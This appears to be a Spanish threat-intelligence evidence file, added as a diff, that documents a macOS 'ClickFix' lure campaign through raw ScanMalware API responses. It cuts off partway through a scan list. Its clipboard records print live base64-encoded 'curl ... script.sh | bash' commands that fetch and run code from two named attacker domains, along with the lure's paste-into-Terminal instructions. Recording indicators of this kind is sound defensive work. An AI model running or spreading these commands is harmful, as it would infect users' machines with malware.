@@ -1,0 +1,595 @@
+================================================================================
+  Evidencia: entrega ClickFix atribuida a Phexia por ScanMalware
+================================================================================
+Consultas pasivas a terceros: ScanMalware.com (pagina del hunt y su API publica),
+urlscan.io, abuse.ch, DNS sobre HTTPS de Cloudflare, RDAP y el blog de Have I
+Been Squatted. NINGUNA pagina senuelo ni servidor de entrega fue visitado: los
+comandos salen de lo que ScanMalware registro en sus propios escaneos del 01-10.
+Respuestas crudas tal cual, con su hora UTC y su SHA-256. Dominios defanged solo
+en este resumen; en las respuestas crudas van como vinieron.
+
+RESUMEN (leido de las respuestas de abajo)
+--------------------------------------------------------------------------------
+pagina senuelo (Cloudflare Pages)          copia al portapapeles (base64 decodificado)
+2026-10-01 09:17:56 UTC  scan a129ab24  securecheckv1-proceed[.]pages[.]dev
+    -> curl -s 'hxxps://virelianmatrix[.]digital/script.sh' | bash
+2026-10-01 09:24:43 UTC  scan 7644e7e5  quicksecurity-checkpointv1[.]pages[.]dev
+    -> curl -s 'hxxps://aetherframework[.]digital/script.sh' | bash
+2026-10-01 09:50:05 UTC  scan 39c8dc5b  quicksecurity-checkpointv1[.]pages[.]dev
+    -> curl -s 'hxxps://aetherframework[.]digital/script.sh' | bash
+2026-10-01 09:50:05 UTC  scan da35a71c  securecheckv1-proceed[.]pages[.]dev
+    -> curl -s 'hxxps://virelianmatrix[.]digital/script.sh' | bash
+2026-10-01 13:20:49 UTC  scan 2c8aabca  securecheckv1-proceed[.]pages[.]dev
+    -> curl -s 'hxxps://virelianmatrix[.]digital/script.sh' | bash
+2026-10-01 16:26:25 UTC  scan 505c315b  quicksecurity-checkpointv1[.]pages[.]dev
+    -> curl -s 'hxxps://aetherframework[.]digital/script.sh' | bash
+
+Lectura:
+  - Las 2 paginas, con el titulo 'Secure Gateway • Quick Verification', copian
+    el mismo formato: bash <<< $(echo "<base64>" | base64 -d). Decodificado es
+    curl -s 'hxxps://<servidor>/script.sh' | bash.
+  - securecheckv1-proceed[.]pages[.]dev entrega desde virelianmatrix[.]digital;
+    quicksecurity-checkpointv1[.]pages[.]dev desde aetherframework[.]digital.
+  - Primer escaneo: 2026-10-01 09:17 UTC; ultimo: 2026-10-01 16:26 UTC.
+  - virelianmatrix[.]digital y aetherframework[.]digital se registraron el MISMO
+    segundo (2026-06-06 10:13:32 UTC, PublicDomainRegistry). Al 08-10 el primero
+    resuelve detras de Cloudflare (no se comprobo si sigue entregando el script);
+    el segundo esta suspendido (clientHold, NS suspended-domain.com) y no resuelve.
+    El RDAP no dice desde cuando; su ultimo cambio registrado es del 2026-08-12.
+  - Ni ScanMalware ni urlscan guardan el contenido de esos dos script.sh, y no
+    hay copia propia. El vinculo con el contrato de Phexia es indirecto:
+    ScanMalware lo afirma, pero su hunt cita como referencias el post de fab0 y
+    el blog de Have I Been Squatted, y sus 6 detecciones coinciden solo por el
+    titulo de la pagina. Have I Been Squatted vio en julio otra cadena, con el
+    mismo patron de entrega (Cloudflare Pages, base64 a bash, script.sh), que
+    consultaba ESTE contrato (seccion 6). Confianza del vinculo: baja a moderada.
+
+--------------------------------------------------------------------------------
+[1] Pagina del hunt en ScanMalware
+--------------------------------------------------------------------------------
+[2026-10-08 16:43:33 UTC] GET https://scanmalware.com/hunts/d95af84a-2cdf-4221-9ca1-42622d88b92e  HTTP 200
+  cuerpo HTML: 39711 bytes, SHA-256 f27ccd88b4b25d58b555348a4dac06749cc96848e262f9e83aaf66c8c961108f
+  Datos de la pagina: familia macos-clickfix-terminal-2026-10; creado 2026-10-01 12:51 UTC
+  (campo added_at "2026-10-01 12:51:52.706460+00:00" del HTML);
+  consulta SMQL: title:"Secure Gateway • Quick Verification" OR
+  secondary_title:"Secure Gateway • Quick Verification"; 6 detecciones (tabla abajo).
+  Afirmaciones de ScanMalware que Intellroom NO pudo verificar: que el script de
+  estas paginas instala Phexia, y que virelianmatrix y aetherframework estan
+  etiquetados publicamente como ClearFake. Las 6 detecciones coinciden solo por el
+  titulo (columna Match: query; sin script asociado). Captura 06 tomada a las
+  16:59 UTC; el HTML de arriba se bajo a las 16:43:33 UTC.
+  Detecciones (scan_id, host, url final con su marca de tiempo 'stamp' en ms):
+    505c315b-c3f6-4695-89f6-00ed611cd5af  quicksecurity-checkpointv1[.]pages[.]dev  stamp 2026-10-01 16:25:55 UTC
+    39c8dc5b-12cf-4643-a111-20c474e67c3a  quicksecurity-checkpointv1[.]pages[.]dev  stamp 2026-10-01 09:49:35 UTC
+    7644e7e5-9a7f-4f80-95b1-50948236f658  quicksecurity-checkpointv1[.]pages[.]dev  stamp 2026-10-01 09:24:13 UTC
+    2c8aabca-c36c-4d81-92bf-3a446d67da0a  securecheckv1-proceed[.]pages[.]dev  stamp 2026-10-01 13:20:19 UTC
+    da35a71c-1c0b-41de-82b2-8bd80f27831b  securecheckv1-proceed[.]pages[.]dev  stamp 2026-10-01 09:49:35 UTC
+    a129ab24-e39d-46aa-8f80-2888ff66943f  securecheckv1-proceed[.]pages[.]dev  stamp 2026-10-01 09:17:25 UTC
+--------------------------------------------------------------------------------
+[2] API publica de ScanMalware: lo que cada pagina copio al portapapeles
+--------------------------------------------------------------------------------
+[2026-10-08 16:55:38 UTC] GET https://scanmalware.com/api/v1/clipboard/2c8aabca-c36c-4d81-92bf-3a446d67da0a  HTTP 200  (3333 bytes, SHA-256 5c4bb42376de427e6f8ec6845ab149f9ca1cd0427aafe79c2d1942a098e9a242)
+{"scan_id":"2c8aabca-c36c-4d81-92bf-3a446d67da0a","events":[{"event_type":"clipboard.writeText","event_timestamp":"2026-10-01T13:20:49.219000","event_data":{"type":"clipboard.writeText","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","timestamp":"2026-10-01T13:20:49.219Z","stackTrace":"Error\n    at Clipboard.writeText (<anonymous>:42:29)\n    at copyToken (https://securecheckv1-proceed.pages.dev/script.js:127:39)\n    at HTMLDivElement.startVerification (https://securecheckv1-proceed.pages.dev/script.js:139:15)\n    at eval (eval at executeScript (:416:16), <anonymous>:47:74)\n    at executeScript (<anonymous>:418:30)\n    at <anonymous>:423:24\n    at callFunction (<anonymous>:386:22)\n    at <anonymous>:400:23\n    at <anonymous>:401:3","contentLength":107,"contentPreview":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"document.execCommand","event_timestamp":"2026-10-01T13:20:49.221000","event_data":{"type":"document.execCommand","command":"copy","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","timestamp":"2026-10-01T13:20:49.221Z","stackTrace":"Error\n    at HTMLDocument.execCommand (<anonymous>:119:33)\n    at copyToken (https://securecheckv1-proceed.pages.dev/script.js:131:22)\n    at async HTMLDivElement.startVerification (https://securecheckv1-proceed.pages.dev/script.js:139:9)","contentLength":107,"hiddenContent":"\n            Complete the instant check\n            1Press ⌘ + Space to open Spotlight2Type Terminal and pressReturn ↵3Hit ⌘ + V to paste the token and hitReturn ↵\n            \n                Done\n  ","visibleContent":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false},"hiddenElementsFound":true},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"copy_event","event_timestamp":"2026-10-01T13:20:49.221000","event_data":{"type":"copy_event","content":"","timestamp":"2026-10-01T13:20:49.221Z","dataModified":"","modifiedData":null,"selectedText":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"}],"statistics":{"total_events":3,"copy_events":0,"paste_events":0,"suspicious_events":3,"first_event_time":"2026-10-01T13:20:49.219000","last_event_time":"2026-10-01T13:20:49.221000"},"source":"database"}
+
+[2026-10-08 16:55:38 UTC] GET https://scanmalware.com/api/v1/clipboard/39c8dc5b-12cf-4643-a111-20c474e67c3a  HTTP 200  (3373 bytes, SHA-256 762a1a60cd118c5811e06c23f7bc54922079a3a12f5e53a2882221b20ef715bb)
+{"scan_id":"39c8dc5b-12cf-4643-a111-20c474e67c3a","events":[{"event_type":"clipboard.writeText","event_timestamp":"2026-10-01T09:50:05.889000","event_data":{"type":"clipboard.writeText","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","timestamp":"2026-10-01T09:50:05.889Z","stackTrace":"Error\n    at Clipboard.writeText (<anonymous>:42:29)\n    at copyToken (https://quicksecurity-checkpointv1.pages.dev/script.js:127:39)\n    at HTMLDivElement.startVerification (https://quicksecurity-checkpointv1.pages.dev/script.js:139:15)\n    at eval (eval at executeScript (:416:16), <anonymous>:47:74)\n    at executeScript (<anonymous>:418:30)\n    at <anonymous>:423:24\n    at callFunction (<anonymous>:386:22)\n    at <anonymous>:400:23\n    at <anonymous>:401:3","contentLength":111,"contentPreview":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"document.execCommand","event_timestamp":"2026-10-01T09:50:05.893000","event_data":{"type":"document.execCommand","command":"copy","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","timestamp":"2026-10-01T09:50:05.893Z","stackTrace":"Error\n    at HTMLDocument.execCommand (<anonymous>:119:33)\n    at copyToken (https://quicksecurity-checkpointv1.pages.dev/script.js:131:22)\n    at async HTMLDivElement.startVerification (https://quicksecurity-checkpointv1.pages.dev/script.js:139:9)","contentLength":111,"hiddenContent":"\n            Complete the instant check\n            1Press ⌘ + Space to open Spotlight2Type Terminal and pressReturn ↵3Hit ⌘ + V to paste the token and hitReturn ↵\n            \n                Done\n  ","visibleContent":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false},"hiddenElementsFound":true},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"copy_event","event_timestamp":"2026-10-01T09:50:05.893000","event_data":{"type":"copy_event","content":"","timestamp":"2026-10-01T09:50:05.893Z","dataModified":"","modifiedData":null,"selectedText":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"}],"statistics":{"total_events":3,"copy_events":0,"paste_events":0,"suspicious_events":3,"first_event_time":"2026-10-01T09:50:05.889000","last_event_time":"2026-10-01T09:50:05.893000"},"source":"database"}
+
+[2026-10-08 16:55:37 UTC] GET https://scanmalware.com/api/v1/clipboard/505c315b-c3f6-4695-89f6-00ed611cd5af  HTTP 200  (3373 bytes, SHA-256 08acec103d8ce277583f7521d3c5ea97223404dc1dd2525e452bdd530a6368e7)
+{"scan_id":"505c315b-c3f6-4695-89f6-00ed611cd5af","events":[{"event_type":"clipboard.writeText","event_timestamp":"2026-10-01T16:26:25.854000","event_data":{"type":"clipboard.writeText","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","timestamp":"2026-10-01T16:26:25.854Z","stackTrace":"Error\n    at Clipboard.writeText (<anonymous>:42:29)\n    at copyToken (https://quicksecurity-checkpointv1.pages.dev/script.js:127:39)\n    at HTMLDivElement.startVerification (https://quicksecurity-checkpointv1.pages.dev/script.js:139:15)\n    at eval (eval at executeScript (:416:16), <anonymous>:47:74)\n    at executeScript (<anonymous>:418:30)\n    at <anonymous>:423:24\n    at callFunction (<anonymous>:386:22)\n    at <anonymous>:400:23\n    at <anonymous>:401:3","contentLength":111,"contentPreview":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"document.execCommand","event_timestamp":"2026-10-01T16:26:25.857000","event_data":{"type":"document.execCommand","command":"copy","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","timestamp":"2026-10-01T16:26:25.857Z","stackTrace":"Error\n    at HTMLDocument.execCommand (<anonymous>:119:33)\n    at copyToken (https://quicksecurity-checkpointv1.pages.dev/script.js:131:22)\n    at async HTMLDivElement.startVerification (https://quicksecurity-checkpointv1.pages.dev/script.js:139:9)","contentLength":111,"hiddenContent":"\n            Complete the instant check\n            1Press ⌘ + Space to open Spotlight2Type Terminal and pressReturn ↵3Hit ⌘ + V to paste the token and hitReturn ↵\n            \n                Done\n  ","visibleContent":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false},"hiddenElementsFound":true},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"copy_event","event_timestamp":"2026-10-01T16:26:25.858000","event_data":{"type":"copy_event","content":"","timestamp":"2026-10-01T16:26:25.858Z","dataModified":"","modifiedData":null,"selectedText":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"}],"statistics":{"total_events":3,"copy_events":0,"paste_events":0,"suspicious_events":3,"first_event_time":"2026-10-01T16:26:25.854000","last_event_time":"2026-10-01T16:26:25.858000"},"source":"database"}
+
+[2026-10-08 16:55:39 UTC] GET https://scanmalware.com/api/v1/clipboard/7644e7e5-9a7f-4f80-95b1-50948236f658  HTTP 200  (3373 bytes, SHA-256 08638086c30664a3a8d692371f7ecea5b954319edd57c03d21c9e674cb88fba8)
+{"scan_id":"7644e7e5-9a7f-4f80-95b1-50948236f658","events":[{"event_type":"clipboard.writeText","event_timestamp":"2026-10-01T09:24:43.671000","event_data":{"type":"clipboard.writeText","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","timestamp":"2026-10-01T09:24:43.671Z","stackTrace":"Error\n    at Clipboard.writeText (<anonymous>:42:29)\n    at copyToken (https://quicksecurity-checkpointv1.pages.dev/script.js:127:39)\n    at HTMLDivElement.startVerification (https://quicksecurity-checkpointv1.pages.dev/script.js:139:15)\n    at eval (eval at executeScript (:416:16), <anonymous>:47:74)\n    at executeScript (<anonymous>:418:30)\n    at <anonymous>:423:24\n    at callFunction (<anonymous>:386:22)\n    at <anonymous>:400:23\n    at <anonymous>:401:3","contentLength":111,"contentPreview":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"document.execCommand","event_timestamp":"2026-10-01T09:24:43.677000","event_data":{"type":"document.execCommand","command":"copy","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","timestamp":"2026-10-01T09:24:43.677Z","stackTrace":"Error\n    at HTMLDocument.execCommand (<anonymous>:119:33)\n    at copyToken (https://quicksecurity-checkpointv1.pages.dev/script.js:131:22)\n    at async HTMLDivElement.startVerification (https://quicksecurity-checkpointv1.pages.dev/script.js:139:9)","contentLength":111,"hiddenContent":"\n            Complete the instant check\n            1Press ⌘ + Space to open Spotlight2Type Terminal and pressReturn ↵3Hit ⌘ + V to paste the token and hitReturn ↵\n            \n                Done\n  ","visibleContent":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false},"hiddenElementsFound":true},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"copy_event","event_timestamp":"2026-10-01T09:24:43.677000","event_data":{"type":"copy_event","content":"","timestamp":"2026-10-01T09:24:43.677Z","dataModified":"","modifiedData":null,"selectedText":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hZXRoZXJmcmFtZXdvcmsuZGlnaXRhbC9zY3JpcHQuc2gnIHwgYmFzaA==\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":111,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"}],"statistics":{"total_events":3,"copy_events":0,"paste_events":0,"suspicious_events":3,"first_event_time":"2026-10-01T09:24:43.671000","last_event_time":"2026-10-01T09:24:43.677000"},"source":"database"}
+
+[2026-10-08 16:55:39 UTC] GET https://scanmalware.com/api/v1/clipboard/a129ab24-e39d-46aa-8f80-2888ff66943f  HTTP 200  (3333 bytes, SHA-256 e08c2cddcb4e9e298acf8edda07a6e956a7acb684f797e6ad25cd703d88b6ced)
+{"scan_id":"a129ab24-e39d-46aa-8f80-2888ff66943f","events":[{"event_type":"clipboard.writeText","event_timestamp":"2026-10-01T09:17:56.178000","event_data":{"type":"clipboard.writeText","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","timestamp":"2026-10-01T09:17:56.178Z","stackTrace":"Error\n    at Clipboard.writeText (<anonymous>:42:29)\n    at copyToken (https://securecheckv1-proceed.pages.dev/script.js:127:39)\n    at HTMLDivElement.startVerification (https://securecheckv1-proceed.pages.dev/script.js:139:15)\n    at eval (eval at executeScript (:416:16), <anonymous>:47:74)\n    at executeScript (<anonymous>:418:30)\n    at <anonymous>:423:24\n    at callFunction (<anonymous>:386:22)\n    at <anonymous>:400:23\n    at <anonymous>:401:3","contentLength":107,"contentPreview":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"document.execCommand","event_timestamp":"2026-10-01T09:17:56.184000","event_data":{"type":"document.execCommand","command":"copy","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","timestamp":"2026-10-01T09:17:56.184Z","stackTrace":"Error\n    at HTMLDocument.execCommand (<anonymous>:119:33)\n    at copyToken (https://securecheckv1-proceed.pages.dev/script.js:131:22)\n    at async HTMLDivElement.startVerification (https://securecheckv1-proceed.pages.dev/script.js:139:9)","contentLength":107,"hiddenContent":"\n            Complete the instant check\n            1Press ⌘ + Space to open Spotlight2Type Terminal and pressReturn ↵3Hit ⌘ + V to paste the token and hitReturn ↵\n            \n                Done\n  ","visibleContent":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false},"hiddenElementsFound":true},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"copy_event","event_timestamp":"2026-10-01T09:17:56.184000","event_data":{"type":"copy_event","content":"","timestamp":"2026-10-01T09:17:56.184Z","dataModified":"","modifiedData":null,"selectedText":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"}],"statistics":{"total_events":3,"copy_events":0,"paste_events":0,"suspicious_events":3,"first_event_time":"2026-10-01T09:17:56.178000","last_event_time":"2026-10-01T09:17:56.184000"},"source":"database"}
+
+[2026-10-08 16:55:38 UTC] GET https://scanmalware.com/api/v1/clipboard/da35a71c-1c0b-41de-82b2-8bd80f27831b  HTTP 200  (3333 bytes, SHA-256 1c3c0875255c32c96ee1e349fedf207e61d06bba0227446eedb6f9bc41699531)
+{"scan_id":"da35a71c-1c0b-41de-82b2-8bd80f27831b","events":[{"event_type":"clipboard.writeText","event_timestamp":"2026-10-01T09:50:05.762000","event_data":{"type":"clipboard.writeText","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","timestamp":"2026-10-01T09:50:05.762Z","stackTrace":"Error\n    at Clipboard.writeText (<anonymous>:42:29)\n    at copyToken (https://securecheckv1-proceed.pages.dev/script.js:127:39)\n    at HTMLDivElement.startVerification (https://securecheckv1-proceed.pages.dev/script.js:139:15)\n    at eval (eval at executeScript (:416:16), <anonymous>:47:74)\n    at executeScript (<anonymous>:418:30)\n    at <anonymous>:423:24\n    at callFunction (<anonymous>:386:22)\n    at <anonymous>:400:23\n    at <anonymous>:401:3","contentLength":107,"contentPreview":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"document.execCommand","event_timestamp":"2026-10-01T09:50:05.766000","event_data":{"type":"document.execCommand","command":"copy","content":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","timestamp":"2026-10-01T09:50:05.766Z","stackTrace":"Error\n    at HTMLDocument.execCommand (<anonymous>:119:33)\n    at copyToken (https://securecheckv1-proceed.pages.dev/script.js:131:22)\n    at async HTMLDivElement.startVerification (https://securecheckv1-proceed.pages.dev/script.js:139:9)","contentLength":107,"hiddenContent":"\n            Complete the instant check\n            1Press ⌘ + Space to open Spotlight2Type Terminal and pressReturn ↵3Hit ⌘ + V to paste the token and hitReturn ↵\n            \n                Done\n  ","visibleContent":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false},"hiddenElementsFound":true},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"},{"event_type":"copy_event","event_timestamp":"2026-10-01T09:50:05.767000","event_data":{"type":"copy_event","content":"","timestamp":"2026-10-01T09:50:05.767Z","dataModified":"","modifiedData":null,"selectedText":"bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly92aXJlbGlhbm1hdHJpeC5kaWdpdGFsL3NjcmlwdC5zaCcgfCBiYXNo\" | base64 -d)","suspiciousContent":{"hasCmd":false,"length":107,"hasCurl":false,"hasBase64":false,"hasPowerShell":false,"hasObfuscation":true,"hasHiddenUnicode":false,"hasScriptDownload":false}},"page_url":null,"element_selector":null,"is_suspicious":true,"suspicious_reason":"hasObfuscation, length"}],"statistics":{"total_events":3,"copy_events":0,"paste_events":0,"suspicious_events":3,"first_event_time":"2026-10-01T09:50:05.762000","last_event_time":"2026-10-01T09:50:05.767000"},"source":"database"}
+
+--------------------------------------------------------------------------------
+[3] Escaneos guardados por ScanMalware para cada host
+--------------------------------------------------------------------------------
+[2026-10-08 16:56:22 UTC] GET https://scanmalware.com/api/v1/domains/securecheckv1-proceed.pages.dev/scans  HTTP 200  (SHA-256 ea066f31c5705f0c1e6572145fe506e1c60dc868bec43e730f297dbf1dc66dde)
+[{"scan_id":"2c8aabca-c36c-4d81-92bf-3a446d67da0a","url":"https://securecheckv1-proceed.pages.dev/?vid=cf2676e87ed4&stamp=1790860797972&nonce=71211","final_url":"https://securecheckv1-proceed.pages.dev/?vid=59240399720c&stamp=1790860819133&nonce=69359","matched_on":["url","final_url"],"status":"completed","scan_type":"public","title":"Secure Gateway • Quick Verification","submitted_at":"2026-10-01T13:20:16.705888","completed_at":"2026-10-01T13:21:00.650015"},{"scan_id":"da35a71c-1c0b-41de-82b2-8bd80f27831b","url":"https://securecheckv1-proceed.pages.dev/","final_url":"https://securecheckv1-proceed.pages.dev/?vid=6495f17129e5&stamp=1790848175231&nonce=59962","matched_on":["url","final_url"],"status":"completed","scan_type":"public","title":"Secure Gateway • Quick Verification","submitted_at":"2026-10-01T09:49:32.382998","completed_at":"2026-10-01T09:50:13.096723"},{"scan_id":"a129ab24-e39d-46aa-8f80-2888ff66943f","url":"https://securecheckv1-proceed.pages.dev/","final_url":"https://securecheckv1-proceed.pages.dev/?vid=4d491b9885ef&stamp=1790846245622&nonce=42967","matched_on":["url","final_url"],"status":"completed","scan_type":"public","title":"Secure Gateway • Quick 